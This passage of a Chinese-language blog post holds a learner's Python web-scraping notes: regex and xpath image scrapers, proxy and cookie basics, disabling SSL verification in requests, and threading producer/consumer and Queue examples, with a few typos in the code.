class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(<span class=\"string\">&#x27;./star_sky&#x27;</span>):</span><br><span class=\"line\">        os.mkdir(<span class=\"string\">&#x27;./star_sky&#x27;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">    url = <span class=\"string\">&#x27;https://cn.bing.com/images/search?q=%E6%98%9F%E7%A9%BA%E5%9B%BE%E7%89%87&amp;qpvt=%e6%98%9f%e7%a9%ba%e5%9b%be%e7%89%87&amp;form=IGRE&amp;first=1&amp;cw=1117&amp;ch=714&#x27;</span></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;user-agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    data_pict = requests.get(url=url, headers=headers).text</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#正则匹配</span></span><br><span class=\"line\">    ex = <span class=\"string\">&#x27;&lt;a class=.*?murl&amp;quot;:&amp;quot;(.*?)&amp;quot;.*?&gt;&#x27;</span></span><br><span class=\"line\">    star_list = re.findall(ex, data_pict, re.S)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> star_list:</span><br><span class=\"line\">        url_2 = i</span><br><span class=\"line\">        <span class=\"comment\">#请求到了图片的二进制数据</span></span><br><span class=\"line\">        data_2_pict = requests.get(url=url_2, headers=headers).content</span><br><span class=\"line\">        <span class=\"comment\">#为图片设置名称</span></span><br><span class=\"line\">        img_name = url_2.split(<span class=\"string\">&quot;/&quot;</span>)[-<span class=\"number\">1</span>]</span><br><span class=\"line\">        img_path = <span class=\"string\">&#x27;./star_sky/&#x27;</span> + img_name</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(img_path, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">            fp.write(data_2_pict)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(img_name + <span class=\"string\">&#x27;...successful&#x27;</span>)</span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">****************************************未完，，待更新********************************************</span><br></pre></td></tr></table></figure>\n<h3 id=\"xpath\"><a href=\"#xpath\" class=\"headerlink\" title=\"xpath\"></a>xpath</h3><ul>\n<li>xpath解析：最常用且最便捷高效的一种解析方式，具有通用性<pre><code>-xpath解析原理：\n    -1、实例化一个etree对象，且需要将被解析的页面源码数据加载到该对象中\n    -2、调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获\n-如何实例化一个etree对象\n    *from lxml import etree\n    -1、将 本地的html文档中的源代码数据加载到etree对象中：\n        etree.parse(filepath)\n    -2、可以将从互联网上获取的数据加载到该对象中\n        etree.HTML(&#39;page_text&#39;)###page_text就是获取的响应数据\n    - xpath(&#39;xpath表达式&#39;)\n    -xpath表达式：\n            - / ：表示的是从根目录结点开始定位，表示的是一个层级\n                    - // : 表示的是多个层级或从任意位置开始定位（前提是//前面没有结点）\n                    -属性定位：tag[@attrName=&quot;attrValue&quot;]\n                    -索引定位：p[n] 索引是从1开始的\n                    -取文本：\n        - /text() 获取的是标签中直系的文本内容\n        - //text() 标签中非直系的文本内容（所有的文本内容）\n        -[0] 可以去除列表框\n            -取属性\n        -/@attrName\n        \n</code></pre>\n</li>\n</ul>\n<h3 id=\"xpath代码实战示例：\"><a href=\"#xpath代码实战示例：\" class=\"headerlink\" title=\"xpath代码实战示例：\"></a>xpath代码实战示例：</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#爬取妹子图片，总共有俩千多张</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    ii = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(<span class=\"string\">&#x27;./girl&#x27;</span>):</span><br><span class=\"line\">        os.mkdir(<span class=\"string\">&#x27;./girl&#x27;</span>)</span><br><span class=\"line\">    url_list = [i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">50</span>)]</span><br><span class=\"line\">    url_list[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> page <span class=\"keyword\">in</span> url_list:</span><br><span class=\"line\">        url = <span class=\"string\">&#x27;https://www.lanvshen.com/zhongguo/&#x27;</span> + <span class=\"built_in\">str</span>(page) +<span class=\"string\">&#x27;.html&#x27;</span></span><br><span class=\"line\">        headers = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;User-Agent&#x27;</span> : <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        get_text = requests.get(url=url, headers=headers)</span><br><span class=\"line\">        tree = etree.HTML(get_text.text)</span><br><span class=\"line\">        pict_ = tree.xpath(<span class=\"string\">&#x27;//div[@class=&quot;hezi&quot;]//li&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> it_ <span class=\"keyword\">in</span> pict_:</span><br><span class=\"line\">            img_url = it_.xpath(<span class=\"string\">&#x27;./a/img/@src&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            img_name = <span class=\"built_in\">str</span>(ii) + <span class=\"string\">&#x27;.jpg&#x27;</span></span><br><span class=\"line\">            img = requests.get(url=img_url, headers=headers).content</span><br><span class=\"line\">            img_path = <span class=\"string\">&#x27;./girl/&#x27;</span> + img_name</span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(img_path, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">                fp.write(img)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(img_name + <span class=\"string\">&#x27;sccuessful...&#x27;</span>)</span><br><span class=\"line\">            ii = ii + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">##此代码存在许多不足之处，所爬取的图片都只是像素低的缩略图，并且下载速度较慢</span></span><br><span class=\"line\"><span class=\"comment\">##后期将学习爬取高清图片，并进行分布式爬取</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"ip代理\"><a href=\"#ip代理\" class=\"headerlink\" title=\"ip代理\"></a>ip代理</h3><ol>\n<li>代理的原理：在请求目的网站之前，先请求代理服务器，然后让代理服务器去请求目的网站，<br>代理服务器拿到目的网站的数据后，再转发给我们的代码</li>\n<li><a href=\"http://httpbin.org/\">这个网站可以方便的查看http请求的一些参数</a> </li>\n<li>在代码中(requests模块)使用代理：</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://httpbin.org&#x27;</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">\t<span class=\"string\">&#x27;User-Anget&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#设置代理</span></span><br><span class=\"line\">proxy = &#123;</span><br><span class=\"line\">\t<span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;123.54.194.96:38661&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">get_text = requerts.get(url=url, headers=headers, proxies=proxy).text</span><br><span class=\"line\"><span class=\"built_in\">print</span>(get_text)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>网络代理有付费和不需要付费的，不需要付费的不稳定，常常会失效</li>\n<li>代理的作用是防止我们在爬取服务器的数据时被反爬虫而被封禁导致我们<br>的 ip 不能用而采取的措施，选择代理应选择隐蔽性高，不透明的</li>\n</ol>\n<h3 id=\"cookie\"><a href=\"#cookie\" class=\"headerlink\" title=\"cookie\"></a>cookie</h3><ul>\n<li><p><a href=\"http://blog.sina.com.cn/s/blog_628571e601019uis.html\">cookie与session的差异</a></p>\n</li>\n<li><p><a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=200538817&idx=2&sn=1147d48f2320fa37e82a7daef4f31c11#rd\">cookie技术深入</a>             </p>\n<ul>\n<li>Cookie是什么？     </li>\n</ul>\n<p>Cookie 是一小段文本信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。<br>Cookie 包含每次用户访问站点时 Web 应用程序都可以读取的信息。</p>\n<ul>\n<li><p>为什么需要Cookie？ </p>\n<p>因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。<br>所以，需要额外的数据用于维护会话。Cookie 正是这样的一段随HTTP请求一起被传递的额外数据。</p>\n</li>\n<li><p>Cookie能做什么？ </p>\n<p>Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求被发送到服务器，所以应该保证它<br>不要太大。Cookie的内容也是明文保存的，有些浏览器提供界面修改，所以， 不适合保存重要的或者涉及隐私的内容。</p>\n</li>\n<li><p>Cookie 的限制</p>\n<p>大多数浏览器支持最大为 4096 字节的 Cookie。由于这限制了 Cookie 的大小，最好用 Cookie 来存储少量数据，<br>或者存储用户 ID 之类的标识符。用户 ID 随后便可用于标识用户，以及从数据库或其他数据源中读取用户信息。<br>浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；<br>如果试图存储更多 Cookie，则最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie<br>总数作出绝对限制，通常为 300 个。</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"C:/Users/Acer/Desktop/笔记/爬虫_day4_files/1.jpg\" alt=\"Cookie示意图\">    </p>\n<ul>\n<li>处理cookie<br>如果想要在多次请求中共享cookie，那么应该使用session</li>\n</ul>\n<h3 id=\"处理不信任的SSL证书\"><a href=\"#处理不信任的SSL证书\" class=\"headerlink\" title=\"处理不信任的SSL证书\"></a>处理不信任的SSL证书</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">resp = resquests.get(url=url, vrrify=<span class=\"literal\">False</span>).content</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"多线程\"><a href=\"#多线程\" class=\"headerlink\" title=\"多线程\"></a>多线程</h3><ul>\n<li>多线程之生产者与消费者模型</li>\n</ul>\n<ul>\n<li>代码示例一：(Lock版)</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">关于多线程生产者消费者模型</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\">gMoney = <span class=\"number\">1000</span></span><br><span class=\"line\">gLock = threading.Lock()</span><br><span class=\"line\">gTotalTimes = <span class=\"number\">10</span></span><br><span class=\"line\">gTimes = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 生产线程Producer</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Producer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gMoney</span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gTimes</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\tmoney = random.randint(<span class=\"number\">100</span>, <span class=\"number\">1000</span>)</span><br><span class=\"line\">\t\t\tgLock.acquire()</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> gTimes &gt;= gTotalTimes:</span><br><span class=\"line\">\t\t\t\tgLock.release()</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\tgMoney += money</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#123;&#125;生产了&#123;&#125;元钱，剩余&#123;&#125;元钱&#x27;</span></span><br><span class=\"line\">\t\t\t\t  .<span class=\"built_in\">format</span>(threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\tgTimes += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\tgLock.release()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 消费线程Consumer</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Consumer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gMoney</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\tmoney = random.randint(<span class=\"number\">100</span>, <span class=\"number\">1000</span>)</span><br><span class=\"line\">\t\t\tgLock.acquire()</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> gMoney &gt;= money:</span><br><span class=\"line\">\t\t\t\tgMoney -= money</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#123;&#125;消费者消费了&#123;&#125;元钱，剩余&#123;&#125;元钱&#x27;</span></span><br><span class=\"line\">\t\t\t\t\t  .<span class=\"built_in\">format</span>(threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># 若剩余金额不足以消费，则退出循环</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> gTimes &gt;= gTotalTimes:</span><br><span class=\"line\">\t\t\t\t\tgLock.release()</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#123;&#125;消费者准备消费&#123;&#125;元钱，剩余&#123;&#125;元钱，不足！&#x27;</span></span><br><span class=\"line\">\t\t\t\t\t  .<span class=\"built_in\">format</span>(threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\tgLock.release()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">mainIt</span>():</span></span><br><span class=\"line\">\t<span class=\"comment\"># 设置3个消费线程</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">\t\tt = Consumer(name=<span class=\"string\">&#x27;消费者线程&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(x))</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\">\t\t<span class=\"comment\"># 设置5个生产线程</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt = Producer(name=<span class=\"string\">&#x27;生产者线程&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(x))</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tmainIt()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>代码示例二：(condition版)</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">gMoney = <span class=\"number\">1000</span></span><br><span class=\"line\">gCondition = threading.Condition()  <span class=\"comment\"># 等同于threading.Lock</span></span><br><span class=\"line\">gTimes = <span class=\"number\">0</span></span><br><span class=\"line\">gTotalTimes = <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Producer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gMoney</span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gCondition</span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gTimes</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\tmoney = random.randint(<span class=\"number\">100</span>, <span class=\"number\">1000</span>)</span><br><span class=\"line\">\t\t\tgCondition.acquire()  <span class=\"comment\"># 加锁（全局变量改变前（gMoney））</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> gTimes &gt;= gTotalTimes:</span><br><span class=\"line\">\t\t\t\tgCondition.release()  <span class=\"comment\"># 解锁</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;当前生产者总共生产了%s次&quot;</span> % gTimes)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\tgMoney += money</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;%s当前存入%s元钱，剩余%s元线&quot;</span> % (threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\tgTimes += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\tgCondition.notify_all()  <span class=\"comment\"># 通知正在等待的线程（wait）</span></span><br><span class=\"line\">\t\t\tgCondition.release()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cosumer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gMoney</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\tmoney = random.randint(<span class=\"number\">100</span>, <span class=\"number\">1000</span>)</span><br><span class=\"line\">\t\t\tgCondition.acquire()</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">while</span> gMoney &lt; money:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> gTimes &gt;= gTotalTimes:</span><br><span class=\"line\">\t\t\t\t\tgCondition.release()</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;%s准备消费%d元钱，剩余%d元钱，不足&quot;</span> % (threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\t\tgCondition.wait()  <span class=\"comment\"># 等待状态  （获取锁） 直到生产者把钱加上 （有钱了再去排队消费）</span></span><br><span class=\"line\">\t\t\tgMoney -= money</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;%s消费了%d元钱，剩余%d元钱&quot;</span> % (threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\tgCondition.release()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">\t\tt = Cosumer(name=<span class=\"string\">&quot;消费者线程%s&quot;</span> % x)</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt1 = Producer(name=<span class=\"string\">&quot;生产者线程%s&quot;</span> % y)</span><br><span class=\"line\">\t\tt1.start()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tmain()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>多线程Lock与condition方法总结：<ol>\n<li>在上述的例子中，lock方法虽然实现了多线程的使用，但是当消费者资金不足时，程序在当前线程会重新whlie True，<br>这就导致了该线程需要再次上锁和解锁，这就导致了CPU的浪费</li>\n<li>当我们使用condition方法时，每当消费者资金不足，该线程无需重新while True，也不需要再次的上锁和解锁，<br>使用wait()，使当资金不足时的消费者线程在wait()暂停并解锁，等待条件满足时再次从wait()处开始执行，这样就<br>减少了循环过程中因上锁解锁而导致的CPu资源浪费</li>\n</ol>\n</li>\n</ul>\n<ul>\n<li>Queue线程安全队列<br>在线程中，访问一些全局变量，枷锁是一个经常的过程，如果你是想把某个数据存储到某个队列中，那么python内置了一个线程安全的模块<br>叫做queue模块。python中的queue模块中提供了同步的、线程安全的模块，其中队列Queue为先进先出，实现了原子操作，即要么不做，要<br>么做完。可使用队列来实现线程的同步。相关函数如下：<br>作用：<br>　　　解耦：使程序直接实现松耦合，修改一个函数，不会有串联关系。<br>　　　提高处理效率：ＦＩＦＯ　＝　现进先出，ＬＩＦＯ　＝　后入先出。</li>\n</ul>\n<ol>\n<li><p>Queue.Queue(maxsize=0)   FIFO， 如果maxsize小于1就表示队列长度无限</p>\n</li>\n<li><p>Queue.LifoQueue(maxsize=0)   LIFO， 如果maxsize小于1就表示队列长度无限</p>\n</li>\n<li><p>Queue.qsize()   返回队列的大小</p>\n</li>\n<li><p>Queue.empty()   如果队列为空，返回True,反之False</p>\n</li>\n<li><p>Queue.full()   如果队列满了，返回True,反之False</p>\n</li>\n<li><p>Queue.get([block[, timeout]])   读队列，取出数据 ，没有数据将会等待timeout等待时间</p>\n</li>\n<li><p>Queue.put(item, [block[, timeout]])   写队列，放入数据，timeout等待时间</p>\n</li>\n<li><p>Queue.queue.clear()   清空队列</p>\n</li>\n<li><p>class queue.PriorityQueue(maxsize=0) 存储数据时可设置优先级的队列，优先级设置数越小等级越高</p>\n</li>\n<li><p>Queue.get(timeout = 1)如果1秒后没取到数据就退出</p>\n</li>\n<li><p>Queue.get_nowait() 取数据，如果没数据抛queue.Empty异常</p>\n</li>\n<li><p>Queue.task_done()后续调用告诉队列，任务的处理是完整的。</p>\n</li>\n</ol>\n<figure class=\"highlight 